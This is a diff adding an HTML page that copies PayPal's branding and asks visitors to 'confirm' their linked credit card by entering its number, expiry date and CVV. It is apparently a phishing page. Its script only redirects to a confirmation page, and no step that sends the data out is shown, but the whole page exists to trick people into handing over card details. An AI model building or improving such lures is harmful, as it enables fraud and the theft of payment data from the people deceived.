@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter Credit Card Details</title>
+    <style>
+        /* Reuse the same CSS */
+        body {
+            background: linear-gradient(135deg, #0070ba, #00488f);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 15px;
+            max-width: 450px;
+            width: 100%;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+        }
+        button {
+            background-color: #0070ba;
+            color: white;
+            border: none;
+            border-radius: 8px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal Logo" style="width: 150px;">
+    <h2>For Confirmation Enter Your Credit Card Details</h2>
+    <form id="creditCardForm">
+        <label for="cardNumber">Your Linked Credit Card Number</label>
+        <input type="text" id="cardNumber" name="cardNumber" placeholder="Enter your credit card number" required>
+        
+        <label for="expiredMonth">Your Credit Card Expired Month</label>
+        <input type="number" id="expiredMonth" name="expiredMonth" placeholder="MM (e.g. 05)" required>
+
+        <label for="expiredYear">Your Credit Card Expired Year</label>
+        <input type="number" id="expiredYear" name="expiredYear" placeholder="YYYY (e.g. 2025)" required>
+
+        <label for="cvv">Your Credit Card CVV</label>
+        <input type="password" id="cvv" name="cvv" placeholder="Enter CVV" required>
+
+        <button type="button" onclick="nextPage()">Submit</button>
+    </form>
+</div>
+
+<script>
+    function nextPage() {
+        // Perform validation or store data if needed
+        window.location.href = "confirmation.html"; // Redirect to the confirmation page
+    }
+</script>
+
+</body>
+</html>
